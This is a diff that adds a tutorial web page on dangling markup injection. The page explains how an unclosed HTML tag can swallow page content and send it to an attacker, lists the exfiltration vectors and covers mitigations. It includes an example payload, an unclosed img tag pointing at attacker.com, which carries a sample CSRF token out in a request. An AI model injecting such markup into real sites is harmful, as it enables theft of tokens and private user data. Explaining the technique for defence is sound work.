@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>How Dangling Markup Injection Steals Sensitive Data - javascript</title>
+    <meta name="description" content="Dangling markup injection is a client-side web security vulnerability that allows attackers to exfiltrate sensitive data from a webpage without executing JavaScript. When defenses such as Content Security Policy (CSP) or strict input sanitizers block tra">
+    <link rel="canonical" href="https://salivity.github.io/javascript/article/how-dangling-markup-injection-steals-sensitive-data">
+    <link rel="search" type="application/opensearchdescription+xml" title="javascript" href="/javascript/opensearch.xml">
+    <link rel="icon" href="/javascript/favicon.ico">
+    <link rel="stylesheet" href="/javascript/css/style.css">
+    <link media="print" rel="stylesheet" href="/javascript/css/print.css">
+    <script src="/javascript/js/fuse.min.js"></script>
+    <script src="/javascript/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <script src="/monetize/monetize.js"></script>
+    <script src="/social/social.js"></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="How Dangling Markup Injection Steals Sensitive Data - javascript" />
+    <meta property="og:url" content="https://salivity.github.io/javascript/article/how-dangling-markup-injection-steals-sensitive-data" />
+    <meta property="og:image:url" content="https://salivity.github.io/javascript/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/javascript/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="Dangling markup injection is a client-side web security vulnerability that allows attackers to exfiltrate sensitive data from a webpage without executing JavaScript. When defenses such as Content Security Policy (CSP) or strict input sanitizers block tra" />
+    <link rel="manifest" href="/javascript/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/javascript/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>javascript</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="/javascript/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article><h1 id="how-dangling-markup-injection-steals-sensitive-data">How
+Dangling Markup Injection Steals Sensitive Data</h1>
+<p>Dangling markup injection is a client-side web security vulnerability
+that allows attackers to exfiltrate sensitive data from a webpage
+without executing JavaScript. When defenses such as Content Security
+Policy (CSP) or strict input sanitizers block traditional Cross-Site
+Scripting (XSS), an attacker can instead inject an unfinished HTML tag.
+The browser attempts to parse this incomplete markup, inadvertently
+absorbing surrounding page content—including CSRF tokens, private user
+information, and session data—into a resource-loading attribute that is
+subsequently transmitted to an attacker-controlled server.</p>
+<h3 id="the-core-mechanism">The Core Mechanism</h3>
+<p>Traditional XSS relies on injecting and executing scripts (such as
+<code>&lt;script&gt;</code> tags or inline event handlers like
+<code>onload</code>). Dangling markup relies strictly on standard HTML
+parsing rules.</p>
+<p>An attacker exploits an input field that reflects unencoded
+characters, specifically quote characters (<code>"</code> or
+<code>'</code>) and tag brackets (<code>&lt;</code>). Instead of
+injecting a complete payload, the attacker injects an opened, unclosed
+HTML element that uses an external resource attribute, such as:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">&#39;https://attacker.com/log?data=</span></span></code></pre></div>
+<p>Notice the single quote opening the <code>src</code> attribute is
+never closed within the injected string.</p>
+<h3 id="the-dangling-effect">The "Dangling" Effect</h3>
+<p>When the browser parses the Document Object Model (DOM), it
+encounters the unfinished <code>src</code> attribute. To resolve the
+attribute value, the HTML parser keeps reading every subsequent
+character on the page until it encounters a matching closing quote
+(<code>'</code>).</p>
+<p>Consider a vulnerable page that displays sensitive data directly
+after an injection point:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>Welcome, User!<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Injection occurs here --&gt;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;csrf_token&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;s3cr3t_t0k3n_v4lu3&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span></code></pre></div>
+<p>If the attacker injects
+<code>&lt;img src='https://attacker.com/log?data=</code>, the rendered
+source becomes:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>Welcome, User!<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">&#39;https://attacker.com/log?data=</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span><span class="st">input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;s3cr3t_t0k3n_v4lu3&quot; /&gt;</span></span></code></pre></div>
+<p>The browser treats everything between the first <code>'</code> and
+the <code>'</code> closing the <code>value</code> attribute as part of
+the URL. The browser constructs an HTTP request equivalent to:</p>
+<pre class="http"><code>GET /log?data=%0A&lt;input%20type=&quot;hidden&quot;%20name=&quot;csrf_token&quot;%20value=s3cr3t_t0k3n_v4lu3 HTTP/1.1
+Host: attacker.com</code></pre>
+<p>The secret token is delivered straight to the attacker's web server
+logs through the browser’s automatic attempt to fetch the image.</p>
+<h3 id="vectors-used-for-exfiltration">Vectors Used for
+Exfiltration</h3>
+<p>Any HTML tag that fetches external resources or redirects navigation
+via an attribute can be leveraged for dangling markup. Common vectors
+include:</p>
+<ul>
+<li><strong>Image tags (<code>&lt;img&gt;</code>):</strong> Triggers an
+immediate <code>GET</code> request via the <code>src</code>
+attribute.</li>
+<li><strong>Form elements
+(<code>&lt;form action="..."&gt;</code>):</strong> Modifies where
+user-submitted data goes, capturing inputs upon form submission.</li>
+<li><strong>Base tags (<code>&lt;base href="..."&gt;</code>):</strong>
+Hijacks all relative links and script requests on the page, redirecting
+subsequent resource loads or user clicks to an external domain.</li>
+<li><strong>Styling links
+(<code>&lt;link rel="stylesheet" href="..."&gt;</code>):</strong>
+Fetches external stylesheets, exfiltrating all swallowed text as the URL
+target.</li>
+</ul>
+<h3 id="bypassing-security-controls">Bypassing Security Controls</h3>
+<p>Dangling markup is primarily used to bypass restrictive Content
+Security Policies. A site may enforce <code>script-src 'none'</code> or
+implement strict nonce checks to completely eliminate the possibility of
+JavaScript execution. However, if the policy loosely defines directives
+such as <code>img-src *</code> or fails to restrict
+<code>default-src</code>, the browser is still permitted to make
+outbound HTTP requests for non-script resources.</p>
+<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+<p>Protecting applications against dangling markup requires multiple
+layers of defense:</p>
+<ol type="1">
+<li><strong>Context-Aware Output Encoding:</strong> Ensure all dynamic
+inputs reflected into HTML are properly encoded. Converting
+<code>&lt;</code> to <code>&amp;lt;</code>, <code>&gt;</code> to
+<code>&amp;gt;</code>, <code>"</code> to <code>&amp;quot;</code>, and
+<code>'</code> to <code>&amp;#x27;</code> prevents attackers from
+breaking out of context and opening new HTML tags.</li>
+<li><strong>Comprehensive CSP Directives:</strong> Restrict destinations
+for resource loading. Explicitly define directives like
+<code>img-src</code>, <code>connect-src</code>, and
+<code>style-src</code> to trusted domains rather than wildcards. Set
+<code>base-uri 'self'</code> to prevent modification of relative URL
+handling.</li>
+<li><strong>Modern Browser Protections:</strong> Current browser
+implementations (including Chrome and Firefox) actively mitigate basic
+dangling markup by preventing URLs inside attributes like
+<code>src</code> and <code>href</code> from spanning across raw newline
+characters or angle brackets. However, strict encoding remains the only
+universal defense.</li>
+</ol></article>
+        <div id="comments-container"></div>
+
+        <script>
+            const utterancesScript = document.createElement('script');
+            
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/javascript'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="social-links">
+            </ul>
+        </nav>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/javascript/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/javascript/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
